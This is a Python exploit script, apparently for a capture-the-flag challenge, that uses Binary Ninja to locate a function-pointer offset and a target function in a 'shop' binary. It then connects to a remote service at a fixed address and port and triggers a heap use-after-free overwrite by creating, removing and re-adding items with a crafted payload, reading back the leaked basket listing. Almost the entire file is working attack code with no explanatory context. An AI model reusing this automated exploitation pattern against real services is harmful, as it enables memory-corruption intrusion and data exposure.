#!/usr/bin/env python3
import binaryninja
from pwn import *

import sys


def select_shop(shop_no):
    io.sendlineafter(b"Which shop do you want to enter: ", str(shop_no).encode())


def createBasket(payload):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"basket : ", payload)


def restoreBasket(filename):
    io.sendlineafter(b">> ", b"6")
    io.sendlineafter(b"tag : ", filename)


def addFruit(size, tag):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"add\n", b"1")
    io.sendlineafter(b"tag : ", str(size).encode())
    io.sendlineafter(b"Fruit : ", tag)


def viewBasket():
    io.sendlineafter(b">> ", b"2")


def removeFruit(idx):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"id : ", str(idx).encode())


if len(sys.argv) < 2:
    print("Usage: binja.py <shop_index>")
    exit(1)

index = sys.argv[1]
bv = binaryninja.load("shop-{}".format(index))


# First identity function with two memset calls
def identify_memset_callsite():
    funcs = bv.functions
    for func in funcs:
        count = 0
        callees = func.callees
        for callee in callees:
            if callee.name == "memset":
                count += 1
        if count == 2:
            return func


def overflow_buffer_size():
    func = identify_memset_callsite()
    if func is None:
        print("Unable to find functions with two memset")
        exit()

    return func.call_sites[1].hlil.params[2].constant


def canary_value():
    data_section = bv.get_section_by_name(".data")
    end = data_section.end
    start = data_section.start
    for address in range(start, end, 8):
        value = bv.read_int(address, size=8)
        if value != 0:
            return value


def get_view_function():
    funcs = bv.functions
    for func in funcs:
        for callee in func.callees:
            if callee.name == "closedir":
                return func


def get_last_assigned_address(bv, func):
    mlil = func.medium_level_il
    last_block = list(mlil.basic_blocks)[-1]
    for inst in reversed(list(last_block)):
        if inst.operation == binaryninja.MediumLevelILOperation.MLIL_STORE:
            return inst.dest.constant
    return None


def get_pointer_offset(bv):
    for i in bv.strings:
        if b"Invalid fruit type \n" in i.raw:
            address = i.start
            break
    # Take the first reference
    reference = next(bv.get_code_refs(address))
    function = reference.function
    # The second last basic block has store operation
    last_block = list(function.medium_level_il.basic_blocks)[-2]
    for inst in last_block:
        if inst.operation == binaryninja.MediumLevelILOperation.MLIL_STORE:
            try:
                return inst.dest.right.constant
            except:
                return 0


pointer_offset = get_pointer_offset(bv)
print(f"Got pointer_offset : 0x{pointer_offset:x}")

view_function = get_view_function().start
print(f"Got View function: 0x{view_function:x}")

payload = [p64(1)] * 4
payload[int(pointer_offset / 8)] = p64(view_function)
payload = b"".join(payload)

io = connect("172.18.159.22", 31337)
select_shop(index)
createBasket(b"A" * 0x8)
addFruit(0x50, b"B" * 0x10)
removeFruit(0)
addFruit(0x21, payload)
viewBasket()

io.recvuntil(b"Available baskets: \n")

basket = []

try:
    while True:
        name = (io.recvline()).decode("utf8").strip()
        if "Fruit" in name:
            break
        if len(name) > 0:
            basket.append(name)
except:
    io.close()

print(str(basket))
